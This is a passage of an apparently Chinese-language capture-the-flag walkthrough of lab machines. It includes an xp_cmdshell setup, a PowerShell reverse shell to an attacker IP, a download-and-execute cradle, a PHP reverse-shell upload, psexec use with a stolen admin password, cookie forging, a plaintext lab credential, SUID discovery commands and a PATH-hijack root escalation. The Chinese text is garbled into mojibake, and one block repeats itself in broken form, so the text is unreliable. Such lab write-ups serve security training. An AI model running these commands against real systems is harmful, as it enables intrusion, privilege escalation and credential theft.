2005ä»¥åé»˜è®¤å…³é—­ï¼Œéœ€è¦æ‰‹åŠ¨å¼€å¯<br>å¼€å¯xp_cmdshellå‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1; //å¼€å¯é«˜çº§é€‰é¡¹</span><br><span class="line">RECONFIGURE; //é…ç½®ç”Ÿæ•ˆ</span><br><span class="line">exec sp_configure&#x27;xp_cmdshell&#x27;, 1; //å¼€å¯xp_cmdshell</span><br><span class="line">RECONFIGURE; //é…ç½®ç”Ÿæ•ˆ</span><br></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡exec sp_configureæŸ¥çœ‹xp_cmdshellçŠ¶æ€ï¼š<br><code>exec sp_configure</code></p><p><img src="../images/image-20230407150243802.png" alt="image-20230407150243802"></p><p>èƒ½æˆåŠŸæ‰§è¡Œä»£è¡¨é…ç½®æˆåŠŸäº†</p><p>çœ‹ä¸€ä¸‹æƒé™å’Œip</p><p><img src="../images/image-20230407150500391.png" alt="image-20230407150500391"></p><p>æˆåŠŸæ‰§è¡Œå‘½ä»¤</p><p>ç„¶åå…¶å®æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡RCEç›´æ¥è¯»å–åˆ°ä½äºsql_svcç”¨æˆ·æ¡Œé¢çš„flagï¼Œä½†æ˜¯ä¸ºäº†æé«˜éš¾åº¦å†³å®šè¦æ‹¿åˆ°shell<br>é€šè¿‡RCEå¯ä»¥åˆ¤æ–­å‡ºç›®æ ‡ç”µè„‘æ²¡æœ‰å®‰è£…javaã€phpã€pythonç­‰ä¸»æµç¼–ç¨‹è¯­è¨€ï¼Œä¹Ÿæ²¡æœ‰å®‰è£…netcatï¼Œæ‰€ä»¥æœ‰ä¸€äº›åå¼¹shellçš„æ–¹æ³•æ— æ³•åšåˆ°</p><p><img src="../images/image-20230407150700760.png" alt="image-20230407150700760"></p><p>æ‰€ä»¥æ‰“ç®—ç”¨<strong>powershell</strong>çš„è„šæœ¬è¿›è¡Œåå¼¹shell<br>å°è¯•ä½¿ç”¨äº†nishangçš„åå¼¹ï¼Œä½†æ˜¯æ²¡æœ‰æˆåŠŸï¼Œè€Œä¸”åœ¨è¿™ä¸ªå‡½æ•°ä¸‹å¾ˆå¤šå‘½ä»¤éƒ½æ— æ³•æ­£å¸¸çš„æ‰§è¡Œï¼Œæœ€ååªèƒ½ç”¨ç®€å•çš„ps1çš„è„šæœ¬è¿›è¡Œåå¼¹</p><p>æŠ˜è…¾äº†åŠå¤©ï¼Œæ‰æŠŠshellå¼¹æˆåŠŸ</p><p><img src="../images/image-20230407154522057.png" alt="image-20230407154522057"></p><p>å…ˆåˆ›å»ºä¸€ä¸ªæ–‡ä»¶  shell.ps1</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">client = New-Object System.Net.Sockets.TCPClient(<span class="string">&quot;10.10.14.8&quot;</span>,4444);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">&quot;# &quot;</span>;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨æ–‡ä»¶æ‰€åœ¨ç›®å½•å¼€ä¸€ä¸ªpython webæœåŠ¡å™¨ç»™sqlserverè®¿é—®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>ç„¶åç›‘å¬ç«¯å£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure><p>æœ€ååœ¨sqlé‚£è¾¹è¾“å…¥å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell &quot;powershell &quot;IEX (New-Object Net.WebClient).DownloadString(\&quot;http://10.10.16.21/shell.ps1\&quot;);&quot;&quot;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±åå¼¹æˆåŠŸï¼Œå°±å¯ä»¥æ±‚æ‹¿æ™®é€šç”¨æˆ·çš„flagäº†</p><p>æ­¤ flag æ”¾åœ¨æ™®é€šç”¨æˆ·çš„æ¡Œé¢ ï¼ˆWindowsä¸‹è¯»å–æ–‡ä»¶å†…å®¹çš„å‘½ä»¤ä¸º typeï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\sql_svc\Desktop\user.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230407154856367.png" alt="image-20230407154856367"></p><p>æ¥ä¸‹æ¥å°±æ˜¯ææƒäº†   å°±æ˜¯ä¸ºäº†æ‹¿åˆ°ç®¡ç†å‘˜è´¦æˆ·çš„flag</p><p><strong>ææƒ</strong></p><p>è·å–çš„å½“å‰ç”¨æˆ·æ˜¯ svc ç”¨æˆ·ï¼Œç”¨äºè¿è¡Œæ•°æ®åº“ã€‚ç®¡ç†å‘˜æƒé™éœ€è¦å†è·å–ã€‚</p><p><strong>æœ¬é¶åœºææƒçš„æ€è·¯æ˜¯ï¼ŒæŸ¥çœ‹ powershell çš„å‘½ä»¤æ‰§è¡Œè®°å½•è·å–å¯†ç ã€‚</strong></p><p>å¯†ç å­˜å‚¨åœ¨ConsoleHost_history.txtä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥æ‰“å¼€è‡ªå·±çš„windowsç”µè„‘æ¥æŸ¥çœ‹ï¼Œä½ç½®æ˜¯ä¸€æ ·çš„</p><p><img src="../images/image-20230407155250444.png" alt="image-20230407155250444"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œä½¿ç”¨net use å¼€æ”¾äº†ä¸€ä¸ªæ–‡ä»¶å…±äº« </p><p>è¯¥å‘½ä»¤çš„ä½œç”¨æ˜¯å°†ä¸»æœºä¸Šçš„backupsæ–‡ä»¶å¤¹æ˜ å°„åˆ°è‡ªå·±çš„Tç›˜ï¼Œåé¢æ˜¯ä¸»æœºçš„ç”¨æˆ·åå’Œå¯†ç ã€‚</p><p><strong>ä½¿ç”¨psexecææƒï¼Œå…¶åŸç†æ˜¯ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.é€šè¿‡ipc$è¿æ¥ï¼Œé‡Šæ”¾psexecsvc.exeåˆ°ç›®æ ‡</span><br><span class="line"> </span><br><span class="line">2.é€šè¿‡æœåŠ¡ç®¡ç†SCManagerè¿œç¨‹åˆ›å»ºpsexecsvcæœåŠ¡ï¼Œå¹¶å¯åŠ¨æœåŠ¡ã€‚</span><br><span class="line"> </span><br><span class="line">3.å®¢æˆ·ç«¯è¿æ¥æ‰§è¡Œå‘½ä»¤ï¼ŒæœåŠ¡ç«¯å¯åŠ¨ç›¸åº”çš„ç¨‹åºå¹¶æ‰§è¡Œå›æ˜¾æ•°æ®ã€‚</span><br><span class="line"> </span><br><span class="line">4.è¿è¡Œå®Œååˆ é™¤æœåŠ¡ã€‚è¿™ä¸ªåœ¨windowsçš„æ—¥å¿—ä¸­æœ‰è¯¦ç»†çš„è®°å½•ï¼Œå¦å¤–psexecåœ¨å°‘æ•°æƒ…å†µä¸‹ä¼šå‡ºç°æœåŠ¡æ²¡åˆ é™¤æˆåŠŸçš„bugã€‚</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>å¦èµ·ç»ˆç«¯æ‰§è¡Œ</p><p>è¿™ä¸ªæ‰§è¡Œå‘½ä»¤å’Œsshå·®ä¸å¤š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-psexec administrator@10.129.32.130</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230407155626594.png" alt="image-20230407155626594"></p><p>æ‹¿åˆ°æœºå™¨çš„ç®¡ç†å‘˜shell</p><p><img src="../images/image-20230407155835471.png" alt="image-20230407155835471"></p><p>æ‹¿åˆ°ç®¡ç†å‘˜çš„flagäº†</p><p><img src="../images/image-20230407155913391.png" alt="image-20230407155913391"></p><p>æŠ˜è…¾äº†å¥½ä¹…ç»ˆäºç»“æŸäº†ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><p><strong>æ€»ç»“</strong></p><p>é€šè¿‡nmapæ‰«æå‘ç°å­˜åœ¨ 445ï¼Œ1433å¼€æ”¾ã€‚smbclient åˆ—å‡ºç›®æ ‡smbå…±äº«ç”¨æˆ·å‘ç°å¯ä»¥åŒ¿åè®¿é—®ï¼Œå‘ç°æ•°æ®åº“è´¦å·å¯†ç  é€šè¿‡impacket é‡Œçš„mssqlclient è¿æ¥ä¸Š<br>å‘ç°æ˜¯saæƒé™ è·å¾—å‘½ä»¤æ‰§è¡Œ é€šè¿‡python3 æ­å»ºç®€æ˜“webæœåŠ¡å™¨<br>è®©ç›®æ ‡ä¸‹è½½powershellè„šæœ¬å¹¶æ‰§è¡Œ åœ¨ç›®æ ‡æ¡Œé¢å‘ç°ç¬¬ä¸€ä¸ªflag æŸ¥çœ‹powershellå†å²è®°å½•ã€‚ç›´æ¥çœ‹è§ç®¡ç†å‘˜è´¦æˆ·å¯†ç ï¼Œå†ç”¨impacketé‡Œçš„psexecè¿æ¥ã€‚</p><h2 id="Oopsie"><a href="#Oopsie" class="headerlink" title="Oopsie"></a>Oopsie</h2><p>è€ƒç‚¹</p><p><img src="../images/image-20230407160549375.png" alt="image-20230407160549375"></p><p>è¿˜æ˜¯å…ˆpingä¸€ä¸‹</p><p><img src="../images/image-20230407163342232.png" alt="image-20230407163342232"></p><p>èƒ½pingæˆåŠŸï¼Œå¼€å§‹æ‰«ä¸€ä¸‹ç«¯å£</p><p><img src="../images/image-20230407163658165.png" alt="image-20230407163658165"></p><p>æ‰«åˆ°ä¸¤ä¸ªç«¯å£ï¼Œ80ç«¯å£çš„versionçœ‹èµ·æ¥åƒä¸€ä¸ªå¯ä»¥è®¿é—®çš„ç½‘å€</p><p>sshå…ˆå»å°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½æ— å¯†ç è¿æ¥</p><p>å‘ç°ä¸èƒ½åè®¿é—®ä¸€ä¸‹ç½‘ç«™</p><p><img src="../images/image-20230407164019071.png" alt="image-20230407164019071"></p><p>å°±æ˜¯ä¸€ä¸ªé™æ€é¡µé¢</p><p>è®¿é—®80ç«¯å£åï¼Œä½¿ç”¨å°æ’ä»¶è·å–åˆ° login çš„æ•æ„Ÿè·¯å¾„ã€‚ï¼ˆå« findsomething ,ç«ç‹åŠChromeå‡å¯åœ¨å¯¹åº”æ’ä»¶å•†åº—ä¸‹è½½ï¼‰</p><p><img src="../images/image-20230407164340474.png" alt="image-20230407164340474"></p><p>æ‰¾åˆ°æœ‰ä¸ªæ•æ„Ÿç™»å½•è·¯å¾„</p><p><img src="../images/image-20230407164509757.png" alt="image-20230407164509757"></p><p>å¾—åˆ°ä¸€ä¸ªç™»å½•æ¡†</p><p>å‘ç°å¯ä½¿ç”¨ guest è´¦æˆ·ç™»å½•ã€‚çŒœæµ‹è¿›å»åè¶Šæƒã€‚</p><p><strong>è¶Šæƒ</strong></p><p><img src="../images/image-20230407164712966.png" alt="image-20230407164712966"></p><p>æˆåŠŸç™»è¿›å»å</p><p><img src="../images/image-20230407164800998.png" alt="image-20230407164800998"></p><p>å‘ç°æœ‰ä¸ªuploadæç¤ºåªæœ‰ç®¡ç†å‘˜æ‰å¯ä»¥è¿›è¡Œä¸Šä¼ ï¼Œæˆ‘ä»¬æŸ¥çœ‹ä¸‹cookieï¼Œçœ‹å¯ä¸å¯ä»¥ä¼ªé€ cookieè¿›è¡Œadminç™»å½•</p><p><img src="../images/image-20230407164938115.png" alt="image-20230407164938115"></p><p>å‘ç°å¯ä»¥ä¼ªé€ cookieè¿›è¡Œç™»å½•</p><p> å°è¯•æ›´æ”¹role ä¸ºadminï¼Œå†è®¿é—® upload åŠŸèƒ½ï¼Œä»æ— æ³•æ‰“å¼€ã€‚åˆ™åº”æ˜¯é€šè¿‡ user çš„å€¼åˆ¤æ–­æ˜¯å¦ä¸ºadmin</p><p>é‚£ admin çš„å€¼ä¸ºå¤šå°‘å‘¢ï¼Ÿ æˆ‘ç¬¬ä¸€ååº”æ˜¯çˆ†ç ´ã€‚åæ¥å‘ç°æ€è·¯ä¸å¯¹ã€‚æ­£ç¡®æ€è·¯æ˜¯åœ¨ account æ¨¡å—ä¸‹å‘ç°äº†</p><p><img src="../images/image-20230407165104564.png" alt="image-20230407165104564"></p><p>è¿™æ ·å°±èƒ½è·å–åˆ°adminçš„accessidäº†</p><p>æ›´æ”¹ä¸‹æ–¹ user çš„ value å€¼ä¸º 34322 ï¼Œè®¿é—® upload æ¨¡å—</p><p><img src="../images/image-20230407165220653.png" alt="image-20230407165220653"></p><p>æˆåŠŸä¼ªé€ æˆç®¡ç†å‘˜è´¦æˆ·äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å°è¯•è¿›è¡Œä¸Šä¼ æœ¨é©¬çœ‹çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/share/webshells/php/php-reverse-shell.php</span><br></pre></td></tr></table></figure><p>å°†ipä¿®æ”¹åå°±è¡Œäº†</p><p><img src="../images/image-20230407172124011.png" alt="image-20230407172124011"></p><p><img src="../images/image-20230407171925546.png" alt="image-20230407171925546"></p><p>ä¸Šä¼ æˆåŠŸæœ¨é©¬æ–‡ä»¶ï¼Œç„¶åæˆ‘ä»¬å°±å»æ‰«ä¸€ä¸‹ç½‘ç«™ç›®å½•ï¼Œçœ‹ä¸€ä¸‹ä¸Šä¼ ç›®å½•åœ¨å“ªï¼Œç„¶åå»è®¿é—®ä¸Šä¼ ç›®å½•çš„æœ¨é©¬å°±å¯ä»¥åå¼¹shelläº†(ä½¿ç”¨gobusterå·¥å…·)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir --url http://10.129.95.204/ --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x php</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230407173155112.png" alt="image-20230407173155112"></p><p>æ‰«åˆ°äº†uploadsæ–‡ä»¶ï¼Œä¼°è®¡å°±æ˜¯è¿™ä¸ªç›®å½•å­˜åœ¨ä¸Šä¼ æ–‡ä»¶ï¼Œç„¶åæˆ‘ä»¬ç›´æ¥å»è®¿é—®çœ‹çœ‹</p><p><img src="../images/image-20230407174631148.png" alt="image-20230407174631148"></p><p>è®¿é—®åæˆåŠŸåå¼¹shell</p><p><img src="../images/image-20230407174723910.png" alt="image-20230407174723910"></p><p> /var/www/html æ˜¯webæœåŠ¡çš„ç›®å½•ï¼Œå³ç½‘ç«™çš„ç›®å½•ã€‚è¿™é‡Œçš„ cdn-cgiç›®å½•ä¸‹å‘ç°äº† db.php</p><p>é‡Œé¢æœ‰è¿æ¥æ•°æ®åº“çš„è´¦æˆ·å¯†ç </p><p><img src="../images/image-20230407174809784.png" alt="image-20230407174809784"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">robert</span><br><span class="line">M3g4C0rpUs3r!</span><br></pre></td></tr></table></figure><p>åœ¨ robert çš„ç”¨æˆ·ç›®å½•ï¼Œå‘ç°ä»–çš„flag</p><p><img src="../images/image-20230407174929348.png" alt="image-20230407174929348"></p><p>æ‹¿åˆ°æ™®é€šç”¨æˆ·çš„flag</p><p><strong>ææƒ</strong></p><p><a href="https://www.freebuf.com/articles/web/272617.html">ç®€è°ˆSUIDææƒ</a></p><p>è¿™é‡Œè€ƒç‚¹å°±æ˜¯è¿™ä¸ªææƒ</p><p>ç›®å‰æ‹¿åˆ°çš„æ˜¯www-dataç”¨æˆ·çš„bashçš„æ‰§è¡Œæƒ(æ‰§è¡Œ whoami æŸ¥çœ‹å³å¯)ã€ä»¥åŠä¸€ä¸ªæ•°æ®åº“çš„è´¦æˆ·å¯†ç ã€‚å› ä¸ºåœ¨ home æ–‡ä»¶å¤¹ä¸‹ä¹Ÿå‘ç°äº†æ­¤è´¦æˆ·ï¼ŒçŒœæµ‹æ­¤è´¦æˆ·çš„å¯†ç ä¸å…¶æ•°æ®åº“å¯†ç ä¸€è‡´ã€‚</p><p>é…åˆæœ€å¼€å§‹çš„sshç«¯å£ï¼Œæƒ³åˆ°å…ˆè¿œç¨‹ç™»å½•ä¸€ä¸‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh robert@10.129.95.204</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230407175212192.png" alt="image-20230407175212192"></p><p>ç™»å½•æˆåŠŸï¼Œæœç„¶å’Œæ•°æ®åº“çš„è´¦æˆ·å¯†ç æ˜¯ä¸€æ ·çš„</p><p> å¦‚æœæœªå¼€æ”¾sshç«¯å£ï¼Œä»è¦ä» bash è½¬æ¢ä¸º ä¼ªç»ˆç«¯ï¼Œå¯æ‰§è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><p> å†åˆ‡æ¢åˆ° robertè´¦æˆ·ã€‚ä¸è¿‡è¿™æ ·ä¸ç¨³å®šï¼Œæ¯•ç«Ÿè¿˜æ˜¯åŸºäºåå¼¹shellè¿æ¥çš„ã€‚</p><p><img src="../images/image-20230407175356208.png" alt="image-20230407175356208"></p><p>å¦‚ä½•è·å¾— root æƒé™å‘¢ï¼Ÿåœ¨ä¸Šä¸€ä¸ªé¶åœºä¸­ï¼Œæˆ‘ä»¬é€šè¿‡æŸ¥çœ‹ powershell çš„å‘½ä»¤è®°å½•è·å–åˆ° Administrator çš„æƒé™ï¼Œè¿™æ¬¡ä½¿ç”¨ SUIDææƒçš„æ–¹æ³•ã€‚</p><p><a href="https://www.freebuf.com/articles/web/272617.html">ç®€è°ˆSUIDææƒ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p>åœ¨æœ¬é¶åœºä¸­ï¼Œå¦‚æœ robert ç”¨æˆ·æ‰§è¡Œçš„æ–‡ä»¶ä»å±äº root ç”¨æˆ·ï¼Œå°±ä¼šç”¨rootç”¨æˆ·çš„æƒé™æ‰§è¡Œæ–‡ä»¶ã€‚</p><p>æŸ¥çœ‹ robert æ‰€åœ¨ç”¨æˆ·ç»„ã€æœç´¢å¯æ‰§è¡Œçš„æ–‡ä»¶ã€å¹¶æŸ¥çœ‹è¯¥æ–‡ä»¶æœ‰æ²¡æœ‰ s æƒé™</p><p>sæƒé™å°±æ˜¯çœ‹æ˜¯å¦å«æœ‰suidæƒé™ï¼Œæœ‰çš„è¯å°±å¯ä»¥åˆ©ç”¨æ¥è¿›è¡Œææƒäº†</p><p><strong>æŸ¥æ‰¾æ˜¯å¦å«æœ‰sæƒé™</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure><p>find / -perm -4000 2&gt;/dev/null æŸ¥æ‰¾å…·æœ‰suidæƒé™çš„æ–‡ä»¶<br>2&gt;/dev/null<br>æ„æ€å°±æ˜¯æŠŠé”™è¯¯è¾“å‡ºåˆ°â€œé»‘æ´â€ï¼Œ/dev/nullè¢«ç§°ä¸ºé»‘æ´</p><p>0â€”â€”æ ‡å‡†è¾“å…¥ï¼ˆstdinï¼‰<br>1â€”â€”æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰<br>2â€”â€”æ ‡å‡†é”™è¯¯ï¼ˆstderrï¼‰</p><p><img src="../images/image-20230407175648124.png" alt="image-20230407175648124"></p><p>æ‰¾åˆ°ä¸€ä¸ªæœ‰ç”¨çš„äº†</p><p>bugtracker è¿™é‡Œä¼šé€šè¿‡è¾“å…¥çš„æ•°å­—æ¥æ˜¾ç¤º bug<br><strong>è¾“å…¥ä¸€ä¸ªä¸å­˜åœ¨çš„æ•°å­— è¿™é‡Œæ˜¾ç¤ºäº†cat ä¸åˆ°</strong><br>è¿™é‡Œæ˜¯ç”¨rootæƒé™å»è°ƒç”¨cat</p><p><img src="../images/image-20230407175915391.png" alt="image-20230407175915391"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è°ƒç”¨catå‘½ä»¤æ²¡æœ‰ä½¿ç”¨catå‘½ä»¤çš„ç»å¯¹è·¯å¾„ï¼Œè€Œæ˜¯ä½¿ç”¨ç»å¯¹è·¯å¾„è°ƒç”¨çš„ï¼Œå³åœ¨å½“å‰ç”¨æˆ·çš„ P A T H ç¯ å¢ƒ å˜ é‡ æŒ‡ å®š çš„ è·¯ å¾„ ä¸­ æœ å¯» c a t å‘½ ä»¤ ã€‚ å¯ ä»¥ åˆ› å»º ä¸€ ä¸ª å ä¸º c a t çš„ æ¶ æ„ å‘½ ä»¤ ï¼Œ å¹¶ ä¿® æ”¹ å½“ å‰ ç”¨ æˆ· çš„ PATHç¯å¢ƒå˜é‡æŒ‡å®šçš„è·¯å¾„ä¸­æœå¯»catå‘½ä»¤ã€‚ å¯ä»¥åˆ›å»ºä¸€ä¸ªåä¸ºcatçš„æ¶æ„å‘½ä»¤ï¼Œå¹¶ä¿®æ”¹å½“å‰ç”¨æˆ·çš„ PATHç¯å¢ƒå˜é‡æŒ‡å®šçš„è·¯å¾„ä¸­æœå¯»catå‘½ä»¤ã€‚å¯ä»¥åˆ›å»ºä¸€ä¸ªåä¸ºcatçš„æ¶æ„å‘½ä»¤ï¼Œå¹¶ä¿®æ”¹å½“å‰ç”¨æˆ·çš„PATHå€¼ä»¥ä½¿bugtrackerè°ƒç”¨æ¶æ„catå‘½ä»¤ï¼Œä»¥è·å–rootæƒé™ã€‚</span><br><span class="line">åˆ‡æ¢åˆ°robertç”¨æˆ·èº«ä»½ï¼Œå°†/tmpç›®å½•è®¾ç½®ä¸ºP A T H ç¯ å¢ƒ å˜ é‡ çš„ ç¬¬ ä¸€ ä¸ª ç›® å½• ï¼Œ åˆ‡ æ¢ åˆ° / t m p ç›® å½• ä¸‹ æ„ é€  æ¶ æ„ c a t å‘½ ä»¤ å¹¶ èµ‹ äºˆ æ‰§ è¡Œ æƒ é™ ã€‚ å½“ b u g t r a c k e r å† æ¬¡ è°ƒ ç”¨ c a t å‘½ ä»¤ æ—¶ å® é™… ä¸Š è°ƒ ç”¨ çš„ æ˜¯ / t m p ç›® å½• ä¸‹ çš„ æ¶ æ„ c a t å‘½ ä»¤ ï¼ˆ s h e l l æ‰§ è¡Œ å‘½ ä»¤ æ—¶ æŒ‰ ç…§ PATHç¯å¢ƒå˜é‡çš„ç¬¬ä¸€ä¸ªç›®å½•ï¼Œåˆ‡æ¢åˆ°/tmpç›®å½•ä¸‹æ„é€ æ¶æ„catå‘½ä»¤å¹¶èµ‹äºˆæ‰§è¡Œæƒé™ã€‚å½“bugtrackerå†æ¬¡è°ƒç”¨catå‘½ä»¤æ—¶å®é™…ä¸Šè°ƒç”¨çš„æ˜¯/tmpç›®å½•ä¸‹çš„æ¶æ„catå‘½ä»¤ï¼ˆshellæ‰§è¡Œå‘½ä»¤æ—¶æŒ‰ç…§PATHç¯å¢ƒå˜é‡çš„ç¬¬ä¸€ä¸ªç›®å½•ï¼Œåˆ‡æ¢åˆ°/tmpç›®å½•ä¸‹æ„é€ æ¶æ„catå‘½ä»¤å¹¶èµ‹äºˆæ‰§è¡Œæƒé™ã€‚å½“bugtrackerå†æ¬¡è°ƒç”¨catå‘½ä»¤æ—¶å®é™…ä¸Šè°ƒç”¨çš„æ˜¯/tmpç›®å½•ä¸‹çš„æ¶æ„catå‘½ä»¤ï¼ˆshellæ‰§è¡Œå‘½ä»¤æ—¶æŒ‰ç…§PATHç¯å¢ƒå˜é‡ä¸­ç›®å½•çš„é¡ºåºæœç´¢ï¼Œæœç´¢åˆ°å³å¼€å§‹æ‰§è¡Œï¼‰ï¼Œæ­¤æ—¶robertç”¨æˆ·ä¸´æ—¶å…·æœ‰äº†rootæƒé™ï¼Œä¸Šé¢çš„idå‘½ä»¤å¯ä»¥çœ‹å‡ºåªæ˜¯robertç”¨æˆ·çš„uidå˜ä¸ºäº†rootï¼Œä¸æ˜¯çœŸæ­£çš„rootç”¨æˆ·ã€‚</span><br></pre></td></tr></table></figure><p>ç®€å•æ¥è¯´å°±æ˜¯å› ä¸ºè°ƒç”¨catå‘½ä»¤çš„æ—¶å€™ä½¿ç”¨pathé‡Œé¢æœç´¢çš„ï¼Œä»å‰å¾€åä¾æ¬¡æœç´¢ï¼Œè°åœ¨å‰æœ‰å°±è°ƒç”¨è°çš„ï¼Œæ‰€ä»¥é—®ä»¬å°±å¯ä»¥è‡ªå·±å®šä¹‰ä¸€ä¸ªè·¯å¾„åœ¨æœ€å‰é¢ï¼Œç„¶åé‡Œé¢æœ‰catå‘½ä»¤ï¼Œç„¶åå°±ä¼šä»¥uid(root)ç”¨æˆ·çš„èº«ä»½æ‰§è¡Œcat</p><p>ç°åœ¨å¦‚æœæˆ‘ä»¬ä¼ªè£… â€œ/bin/bashâ€ ä¸º catï¼Œé‚£ä¹ˆæ‰§è¡Œ æ­¤ç¨‹åºæ—¶ï¼Œå°±ä¼šè·å¾— rootæƒé™çš„shell</p><p><img src="../images/image-20230407180615180.png" alt="image-20230407180615180"></p><p>è¿™æ ·çš„è¯/tmpå°±åœ¨æœ€å‰é¢äº†</p><p><img src="../images/image-20230407180936729.png" alt="image-20230407180936729"></p><p><img src="../images/image-20230407181013708.png" alt="image-20230407181013708"></p><p>è¿™é‡Œä¸èƒ½ä½¿ç”¨catçš„åŸå› æ˜¯catè¢«æˆ‘ä»¬ä¿®æ”¹äº†</p><h2 id="vaccine"><a href="#vaccine" class="headerlink" title="vaccine"></a>vaccine</h2><p>è€ƒç‚¹</p><p><img src="../images/image-20230408152244023.png" alt="image-20230408152244023"></p><p><img src="../images/image-20230408152401774.png" alt="image-20230408152401774"></p><p>èƒ½pingé€š</p><p>å»æ‰«ä¸€ä¸‹ç«¯å£</p><p><img src="../images/image-20230408152523785.png" alt="image-20230408152523785"></p><p>æ‰«åˆ°ä¸‰ä¸ªç«¯å£   ä¸€ä¸ªæ˜¯ftpæœåŠ¡å™¨ç«¯å£   ä¸€ä¸ªæ˜¯sshç«¯å£  ä¸€ä¸ªæ˜¯80ç«¯å£(çœ‹èµ·æ¥åƒæ˜¯ä¸€ä¸ªç½‘ç«™)</p><p>ç„¶åè¿˜æ˜¯è€æ€è·¯å°è¯•ä¸€ä¸‹å¯ä¸å¯ä»¥è¿›è¡ŒåŒ¿åç™»å½•</p><p><img src="../images/image-20230408152820068.png" alt="image-20230408152820068"></p><p>åŒ¿åç™»å½•æˆåŠŸ</p><p>æŸ¥çœ‹æ–‡ä»¶,ç«Ÿç„¶æœ‰å‹ç¼©åŒ…,çœ‹è¿™åç§°,å¤§æ¦‚ç‡æ˜¯æºç ,ä¸‹è½½</p><p><img src="../images/image-20230408153021471.png" alt="image-20230408153021471"></p><p>ç„¶åå°è¯•è¿›è¡Œè§£å‹æŸ¥çœ‹</p><p><img src="../images/image-20230408153128680.png" alt="image-20230408153128680"></p><p>å‘ç°éœ€è¦å¯†ç æ‰èƒ½æŸ¥çœ‹æºç </p><p>å°è¯•sshç™»å½•ï¼Œä¸è¡Œï¼Œæœ‰å¯†ç ä¸”ä¸æ˜¯å¼±ç±»å‹å¯†ç </p><p><img 